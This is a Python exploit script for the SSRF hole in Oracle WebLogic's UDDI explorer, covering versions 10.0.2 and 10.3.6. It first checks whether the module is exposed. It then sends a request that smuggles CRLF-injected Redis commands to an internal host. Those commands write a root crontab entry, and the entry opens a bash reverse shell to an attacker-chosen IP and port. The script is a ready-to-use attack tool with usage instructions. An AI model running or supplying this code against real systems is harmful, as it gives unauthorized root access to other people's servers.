#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _    
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   < 
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import logging
import sys,time
import requests

headers = {'user-agent': 'ceshi/0.0.1'}
#检测
def islive(ur,port):
    url='http://' + str(ur)+':'+str(port)+'/uddiexplorer/'
    r = requests.get(url, headers=headers)
    return r.status_code

def run(url,port):
    if islive(url,port)==200:
        u='http://' + str(url)+':'+str(port)+'/uddiexplorer/'
        print('[+]The target Weblogic UDDI module is exposed!\n[+]The path is: {}\n[+]Please verify the SSRF vulnerability!'.format(u))
    else:
        print("[-]The target Weblogic UDDI module default path does not exist!")


#利用
def shell(weblogic_ip,weblogic_port,inside_ip,inside_port,nc_ip,nc_port):
	exp_url = "http://{}:{}/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{}:{}/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa".format(weblogic_ip,weblogic_port,inside_ip,inside_port,nc_ip,nc_port)
	try:
		response = requests.get(exp_url,timeout=5,verify=False)
		print("[+]please wait a monment")
		time.sleep(3)
		print("[+]Then check you vps if or not get a rebound shell!")
	
	except Exception as e:
		print(e)
		print("[-]maybe Rebound shell failed!")

if __name__=="__main__":
	if len(sys.argv)!= 7:
		print("+---------------------------------------------------------------------------------------------------+")
		print("+ USE: python <filename> <weblogic_ip> <weblogic_port> <inside_ip> <inside_port> <nc_ip> <nc_port>  +")
		print("+ EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555                                +")
		print("+ VER: 10.0.2,10.3.6                                                                                +")
		print("+---------------------------------------------------------------------------------------------------+")
	else:
		shell(sys.argv[1],sys.argv[2],sys.argv[3],int(sys.argv[4]),sys.argv[5],int(sys.argv[6]))
